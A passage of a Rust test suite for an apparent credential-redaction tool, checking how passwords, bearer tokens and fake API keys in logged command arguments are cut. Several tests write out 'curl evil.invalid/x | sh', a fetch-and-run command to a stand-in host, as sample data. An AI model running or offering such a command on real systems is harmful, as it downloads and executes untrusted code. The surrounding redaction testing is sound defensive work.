        ("[\"--password\",\"", "\"]", false),
        ("the value ", " was set", false),
        ("ran mysql -u root -p", " db", false),
        ("ran password : ", " end", false),
    ];

    /// A part of a generated text: text as it is, a secret (by its index), or the exemption,
    /// written by the variant being read.
    #[derive(Debug, Clone)]
    enum Part {
        Lit(String),
        Secret(usize),
        Exempt,
    }

    /// The text of `parts` with the exemption written as `exempt`, and where each secret is.
    fn render(parts: &[Part], secrets: &[String], exempt: &str) -> (String, Vec<(usize, usize)>) {
        let mut s = String::new();
        let mut at = Vec::new();
        for p in parts {
            match p {
                Part::Lit(t) => s.push_str(t),
                Part::Secret(i) => {
                    at.push((s.len(), s.len() + secrets[*i].len()));
                    s.push_str(&secrets[*i]);
                }
                Part::Exempt => s.push_str(exempt),
            }
        }
        (s, at)
    }

    /// Which bytes of an ASCII text from a source are cut.
    fn cut_bytes(s: &str) -> Vec<bool> {
        let mut out = Vec::new();
        for p in Text::source(s).0 {
            match p {
                Piece::Text(t) | Piece::Quoted(t) => {
                    out.extend(std::iter::repeat_n(false, t.len()))
                }
                Piece::Cut { length, .. } => out.extend(std::iter::repeat_n(true, length)),
            }
        }
        assert_eq!(out.len(), s.len(), "{s}");
        out
    }

    #[test]
    fn an_exemption_hides_no_secret_that_a_boundary_nothing_or_an_unknown_mark_in_its_place_would_show()
     {
        // An exemption covers only its own bytes and never changes how any other byte is read.
        // Each text is read with a mark of a known kind, or a kind written out in a list of cuts,
        // and again with it replaced by spaces of its length, by nothing, and by one of a kind
        // the set does not cut: every byte of a secret any of these cuts is cut with the
        // exemption too. Texts are generated from a seed, so a failure is the same every time.
        let families = families();
        let grammars = GRAMMARS;
        let seps = ["", " ", ",", ";", ")", "]", "}", ">", "\"", "'"];
        // The exemptions, each with its text around it: a mark bare, with its backslash doubled,
        // and a kind written out in a list of cuts; and what stands in their place.
        let exemptions: [(&str, String, &str, &str); 4] = [
            ("", mark(FLAG_VALUE, 11), "", "\\cut{zz 1}"),
            ("", mark("gitleaks:github-pat", 40), "", "\\cut{zz 1}"),
            (
                "",
                format!("\\{}", mark(FLAG_VALUE, 11)),
                "",
                "\\\\cut{zz 1}",
            ),
            (
                "{\"kind\":\"",
                "detect-secrets:basic-auth".to_string(),
                "\",\"length\":11}",
                "zz",
            ),
        ];
        let mut x: u64 = 0x5eed_cafe;
        let mut next = |n: usize| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            (x % n as u64) as usize
        };
        let (mut texts, mut cut_elsewhere, mut skipped) = (0, 0, 0);
        for t in 0..3000u64 {
            let (prefix, suffix, starts) = grammars[next(grammars.len())];
            let (family, make) = &families[next(families.len())];
            let sep = seps[next(seps.len())];
            let (before, ex, after, unknown) = &exemptions[next(exemptions.len())];
            let secrets = vec![make(t * 3 + 11), make(t * 3 + 12)];
            let lit = |s: &str| Part::Lit(s.to_string());
            let around = |p: Vec<Part>| {
                let mut v = vec![lit(prefix)];
                v.extend(p);
                v.push(lit(suffix));
                v
            };
            let exempt = || vec![lit(before), Part::Exempt, lit(after)];
            let placement = next(4);
            let mut slot = Vec::new();
            match placement {
                // before
                0 => {
                    slot.extend(exempt());
                    slot.extend([lit(sep), Part::Secret(0)]);
                }
                // after
                1 => {
                    slot.extend([Part::Secret(0), lit(sep)]);
                    slot.extend(exempt());
                }
                // around
                2 => {
                    slot.extend(exempt());
                    slot.extend([lit(sep), Part::Secret(0), lit(sep)]);
                    slot.extend(exempt());
                }
                // between
                _ => {
                    slot.extend([Part::Secret(0), lit(sep)]);
                    slot.extend(exempt());
                    slot.extend([lit(sep), Part::Secret(1)]);
                }
            }
            // A value with no pattern of its own after an exemption that is the whole value is
            // not cut, by the rule: in a longer text, where a boundary or nothing in its place
            // would make the next word the value, the exemption is the value.
            let leads = matches!(placement, 0 | 2);
            if *family == "password" && leads && !starts {
                skipped += 1;
                continue;
            }
            let parts = around(slot);
            texts += 1;
            let (known, at) = render(&parts, &secrets, ex);
            let with = cut_bytes(&known);
            for other in [" ".repeat(ex.len()), String::new(), unknown.to_string()] {
                let (s, at_other) = render(&parts, &secrets, &other);
                let cut = cut_bytes(&s);
                for (&(ks, ke), &(os, _)) in at.iter().zip(&at_other) {
                    for i in 0..ke - ks {
                        if cut[os + i] {
                            cut_elsewhere += 1;
                        }
                        assert!(
                            !cut[os + i] || with[ks + i],
                            "a byte of a {family} secret is shown with the exemption and cut \
                             with {other:?} in its place: {parts:?}\nwith: {:?}\nwithout: {:?}",
                            Text::source(&known).shown(str::to_string),
                            Text::source(&s).shown(str::to_string),
                        );
                    }
                }
            }
        }
        println!("{texts} texts, {skipped} skipped, {cut_elsewhere} secret bytes cut in a variant");
        assert!(texts > 2000 && cut_elsewhere > 100_000);
    }

    /// The arguments cut, with the exemptions read or not, as they are shown.
    fn shown_exempting(args: &[String], exempt: bool) -> Vec<String> {
        cut_exempting(
            set().ok(),
            args.iter().map(|a| text_pieces(a)).collect(),
            exempt,
        )
        .iter()
        .map(|p| show(p, &str::to_string))
        .collect()
    }

    #[test]
    fn a_text_that_holds_no_exemption_is_cut_as_if_exemptions_did_not_exist() {
        // No rule made for quotes changes how a real value is read. Texts that hold no mark and
        // no kind in a list of cuts, generated from a seed, as one argument and split into
        // arguments at their spaces, are cut the same with the exemptions read and without.
        let families = families();
        let mut x: u64 = 0xc0ff_ee11;
        let mut next = |n: usize| {
            x ^= x << 13;
            x ^= x >> 7;
            x ^= x << 17;
            (x % n as u64) as usize
        };
        // The forms a reviewer found, a string that opens before the key and a closer after it,
        // and the grammar of the test above.
        let mut grammars: Vec<(&str, &str)> = GRAMMARS.iter().map(|g| (g.0, g.1)).collect();
        grammars.extend([
            ("curl -H \"Authorization: Bearer ", " u"),
            ("\"Authorization: Bearer ", ""),
            ("\"--password=", ""),
            ("{\"cmd\":\"--password=", ""),
            ("ran [\"Authorization: Bearer ", " next"),
        ]);
        let seps = [
            "", " ", ",", ";", ")", "]", "}", ">", "\"", "'", "\",", "\"],", "\"},", "\" ",
        ];
        let (mut texts, mut cut) = (0, 0);
        for t in 0..3000u64 {
            let (prefix, suffix) = grammars[next(grammars.len())];
            let (_, a) = &families[next(families.len())];
            let (_, b) = &families[next(families.len())];
            let s = format!(
                "{prefix}{}{}{}{suffix}",
                a(t * 2 + 31),
                seps[next(seps.len())],
                b(t * 2 + 32)
            );
            for args in [
                vec![s.clone()],
                s.split(' ').map(str::to_string).collect::<Vec<_>>(),
            ] {
                texts += 1;
                let with = shown_exempting(&args, true);
                assert_eq!(with, shown_exempting(&args, false), "{args:?}");
                cut += with.iter().filter(|a| a.contains("\\cut{")).count();
            }
        }
        println!("{texts} texts, {cut} arguments cut, the same with exemptions and without");
        assert!(texts == 6000 && cut > 5000, "{cut}");
        // Without the exemptions a mark is read as text, so the switch is one.
        let quoted = vec![format!("ran --password {} next", mark(FLAG_VALUE, 11))];
        assert_ne!(
            shown_exempting(&quoted, true),
            shown_exempting(&quoted, false)
        );
    }

    /// Whether any 8 characters in a row of `secret` are in `shown`.
    fn chunk_shown(shown: &str, secret: &str) -> bool {
        let c: Vec<char> = secret.chars().collect();
        c.windows(8.min(c.len()))
            .any(|w| shown.contains(&w.iter().collect::<String>()))
    }

    #[test]
    fn a_token_glued_to_a_mark_before_after_or_around_it_is_cut_as_beside_a_boundary() {
        let tokens = [
            format!(
                "{}{}",
                ["AK", "IA"].concat(),
                body("ABCDEFGHIJKLMNOPQRSTUVWXYZ234567", 16, 1)
            ),
            format!("{}{}", ["AI", "za"].concat(), body(ALNUM, 35, 2)),
            format!("{}{}", ["sk", "_live_"].concat(), body(ALNUM, 24, 3)),
            format!("{}{}", ["np", "m_"].concat(), body(LOWER, 36, 4)),
            format!(
                "{}{}.{}{}.{}",
                ["ey", "J"].concat(),
                body(ALNUM, 20, 5),
                ["ey", "J"].concat(),
                body(ALNUM, 20, 6),
                body(ALNUM, 20, 7)
            ),
            format!("{}{}", ["gh", "p_"].concat(), body(ALNUM, 36, 8)),
            format!("{}{}", ["gl", "pat-"].concat(), body(ALNUM, 20, 9)),
            format!(
                "{}{}-{}-{}",
                ["xo", "xb-"].concat(),
                body("0123456789", 12, 10),
                body("0123456789", 12, 11),
                body(ALNUM, 24, 12)
            ),
            format!(
                "{}{}.{}",
                ["SG", "."].concat(),
                body(ALNUM, 22, 13),
                body(ALNUM, 43, 14)
            ),
        ];
        let marks = [
            mark(FLAG_VALUE, 11),
            mark("gitleaks:github-pat", 40),
            format!("\\{}", mark(FLAG_VALUE, 11)),
        ];
        let mut taken = 0;
        let places: [fn(&str, &str) -> String; 10] = [
            |m, p| format!("ran {m}{p} end"),
            |m, p| format!("ran {p}{m} end"),
            |m, p| format!("ran {m}{p}{m} end"),
            |m, p| format!("ran {m} {p} end"),
            |m, p| format!("ran {m}:{p} end"),
            |m, p| format!("ran {m}={p} end"),
            |m, p| format!("ran {m}-{p} end"),
            |m, p| format!("ran [\"{m}\",\"{p}\"] end"),
            |m, p| format!("ran {p},{m} end"),
            |m, p| format!("ran {p}.{m} end"),
        ];
        for t in &tokens {
            assert!(!chunk_shown(
                &text(&format!("ran {t} end"), str::to_string),
                t
            ));
            for place in places {
                for m in &marks {
                    // What a boundary in the mark's place leaves, such as a token gitleaks does
                    // not take before a comma, is not the mark's doing.
                    let s = place(m, t);
                    let bare = place(" ", t);
                    let shown = chunk_shown(&Text::source(&s).store(), t);
                    assert!(
                        !shown || chunk_shown(&text(&bare, str::to_string), t),
                        "{s}"
                    );
                    taken += usize::from(!shown);
                }
            }
        }
        // Nine tokens, ten places, three marks: all but those after a comma or before a dot.
        assert!(taken >= 9 * 8 * 3, "{taken}");
        // A generic key's value glued after a mark is read whole, so its entropy is its own.
        let long = ["Qz7Wk4", "Rm2Tx9", "Pd3Vn6", "Bc1Hd5"].concat();
        let m = mark(FLAG_VALUE, 11);
        for s in [
            format!("ran aws_creds = {m}{long}"),
            format!("ran \"api_key\": \"{m}{long}\""),
            format!("ran password : {m}{long}"),
            format!("ran secret_value={m}{long}"),
        ] {
            assert!(!chunk_shown(&Text::source(&s).store(), &long), "{s}");
        }
    }

    #[test]
    fn a_value_that_begins_with_a_mark_is_cut_to_where_a_real_value_would_end() {
        // Only a value that is the mark alone, with the quotes and closers that end its word, is
        // not cut; `,`, `]` and `}` end no word.
        let pw = ["Hj6", "Wd2", "Nc9", "Ty"].concat();
        let m = mark(FLAG_VALUE, 11);
        for s in [
            format!("ran --password={m},{pw} end"),
            format!("ran --password={m}]{pw} end"),
            format!("ran --password={m}}}{pw} end"),
            format!("ran --password={m}\"],{pw} end"),
            format!("ran --password={m}x{pw} end"),
            format!("ran --password {m},{pw}"),
            format!("--password={m},{pw}"),
            format!("--password={m} {pw}"),
            format!("Authorization: Bearer {m},{pw}"),
            format!("Authorization: Bearer {m} {pw}"),
            format!("ran https://u:{m},{pw}@h.invalid/r"),
            format!("ran mysql -p{m},{pw} db"),
            format!("ran --password={m}{m}{pw}"),
            format!("ran --password={m}\\{pw}"),
            format!("ran --password={m}'{pw}'"),
            format!("ran --password={m}\"{pw}\""),
        ] {
            assert!(!chunk_shown(&Text::source(&s).store(), &pw), "{s}");
        }
        for args in [
            strings(&["tool", &format!("--password={m} {pw}")]),
            strings(&["tool", "--password", &format!("{m} {pw}")]),
            strings(&["tool", "--password", &format!("{m},{pw}")]),
            strings(&["tool", &format!("--password={m}x{pw}")]),
            strings(&["curl", "-H", &format!("Authorization: Bearer {m} {pw}")]),
        ] {
            let shown = Args::raw(&args).shown(str::to_string).join(" ");
            assert!(!shown.contains(&pw), "{args:?}: {shown}");
        }
    }

    #[test]
    fn a_kind_is_exempt_only_where_the_core_prints_it_in_a_list_of_cuts() {
        let pw = ["Hj6", "Wd2", "Nc9", "Ty"].concat();
        for s in [
            format!("immune:mysql-password={pw}"),
            format!("ran immune:mysql-password={pw}"),
            format!("ran detect-secrets:basic-auth={pw}"),
        ] {
            assert!(!chunk_shown(&Text::source(&s).store(), &pw), "{s}");
        }
        // In the shape it is exempt in, it is read around as any other word would be.
        let s = format!("{{\"kind\":\"immune:flag-value\",\"password\":\"{pw}\"}}");
        let other = s.replace("immune:flag-value", "zz");
        assert_eq!(
            chunk_shown(&text(&s, str::to_string), &pw),
            chunk_shown(&text(&other, str::to_string), &pw),
            "{s}"
        );
        let listed = r#"[{"argument":0,"kind":"immune:flag-value","length":11}]"#;
        assert_eq!(text(listed, str::to_string), listed);
        // What only stands where a kind would is no kind the set cuts, and is read.
        let npm = format!("{}{}", ["np", "m_"].concat(), body(LOWER, 36, 21));
        let s = format!("[{{\"argument\":0,\"kind\":\"{npm}\",\"length\":11}}]");
        assert!(!chunk_shown(&text(&s, str::to_string), &npm), "{s}");
        // Inside a JSON string, its quotes escaped, it is no name; written out with spaces it
        // is the same shape.
        for listed in [
            r#"{\"argument\":0,\"kind\":\"detect-secrets:basic-auth\",\"length\":11}"#,
            r#"{"argument": 0, "kind": "detect-secrets:basic-auth", "length": 11}"#,
        ] {
            assert_eq!(text(listed, str::to_string), listed);
        }
    }

    #[test]
    fn a_value_in_a_string_that_opened_before_its_key_runs_on_past_the_closer_in_its_word() {
        // `curl -H "Authorization: Bearer A",B` gives curl `Bearer A,B`: what is glued on after
        // the string closes is the same shell word, so it is the value too.
        let (a, b) = (
            ["Pq8", "Zr5", "Lm3", "Xv"].concat(),
            ["Hj6", "Wd2", "Nc9", "Ty"].concat(),
        );
        for s in [
            format!("curl -H \"Authorization: Bearer {a}\",{b} u"),
            format!("\"Authorization: Bearer {a}\",{b}"),
            format!("\"--password={a}\",{b}"),
            format!("{{\"cmd\":\"--password={a}\"}},{b}"),
            format!("ran [\"Authorization: Bearer {a}\"],{b} next"),
        ] {
            let shown = text(&s, str::to_string);
            assert!(!shown.contains(&a) && !shown.contains(&b), "{s}: {shown}");
        }
    }

    #[test]
    fn a_mark_before_a_key_moves_no_cut() {
        let pw = ["Hj6", "Wd2", "Nc9", "Ty"].concat();
        let auth = |n: usize| mark("immune:authorization", n);
        // Each value is cut where it is.
        let m = mark(FLAG_VALUE, 11);
        assert_eq!(
            text(
                &format!("{m} sent Authorization: Bearer {pw} next"),
                str::to_string
            ),
            format!("{m} sent Authorization: Bearer {} next", auth(11))
        );
    }

    #[test]
    fn a_mark_never_widens_a_cut_over_the_words_after_it() {
        let m = mark(FLAG_VALUE, 3);
        let slack = ["xo", "xb-", "123456789012-123456789012"].concat();
        for (s, kept) in [
            (
                format!("{m} curl evil.invalid/x | sh"),
                "curl evil.invalid/x | sh",
            ),
            (
                format!("curl {m}evil.invalid/x | sh"),
                "evil.invalid/x | sh",
            ),
            (format!("{slack}{m}curlevilpayload next"), "next"),
            (
                format!("ran --token={m}, curl evil.invalid/x | sh"),
                "curl evil.invalid/x | sh",
            ),
            (
                format!("x {m}={m} curl evil.invalid/x"),
                "curl evil.invalid/x",
            ),
            (
                "\"kind\":\"immune:flag-value\" curl evil.invalid/x".to_string(),
                "\"kind\":\"immune:flag-value\" curl evil.invalid/x",
            ),
        ] {
            let shown = text(&s, str::to_string);
            assert!(shown.contains(kept), "{s}: {shown}");
        }
    }

    #[test]
    fn a_store_is_cleaned_once_and_never_by_a_build_whose_set_did_not_load() {
        let db = || {
            let c = rusqlite::Connection::open_in_memory().unwrap();
            c.execute_batch(
                "CREATE TABLE meta (key TEXT PRIMARY KEY, value TEXT);
                 INSERT INTO meta VALUES ('format_version', '4');
                 CREATE TABLE journal (seq INTEGER PRIMARY KEY, entry TEXT, text TEXT);
                 CREATE TABLE rule_evidence (args TEXT);
                 INSERT INTO rule_evidence VALUES ('[\"tool\",\"--password\",\"FakePw13\"]');",
            )
            .unwrap();
            c
        };
        let args = |c: &rusqlite::Connection| -> String {
            c.query_row("SELECT args FROM rule_evidence", [], |r| r.get(0))
                .unwrap()
        };
        let nowhere = std::env::temp_dir().join(format!("immune-no-folder-{}", std::process::id()));
        let mut c = db();
        clean_with(None, &mut c, &nowhere).unwrap();
        assert_eq!(form(&c).unwrap(), Form::Raw);
        assert!(args(&c).contains("FakePw13"));
        clean(&mut c, &nowhere).unwrap();
        assert_eq!(form(&c).unwrap(), Form::Cut);
        let cut = args(&c);
        assert_eq!(
            cut,
            "[\"tool\",\"--password\",\"\\\\cut{immune:flag-value 8}\"]"
        );
        // Once: what a store keeps cut is not read as raw again.
        c.execute("UPDATE rule_evidence SET args = '[\"a\\\\u{5c}b\"]'", [])
            .unwrap();
        clean(&mut c, &nowhere).unwrap();
        assert_eq!(args(&c), "[\"a\\\\u{5c}b\"]");
    }

    #[test]
    fn entropy_is_gitleaks_s_counted_by_character_over_the_length_in_bytes() {
        assert_eq!(entropy(""), 0.0);
        assert_eq!(entropy("aaaa"), 0.0);
        assert_eq!(entropy("abab"), 1.0);
        assert_eq!(entropy("abcd"), 2.0);
        // Two characters of two bytes each: one kind, counted twice over four bytes, as Go's
        // `len` counts.
        assert_eq!(entropy("éé"), 0.5);
    }
}
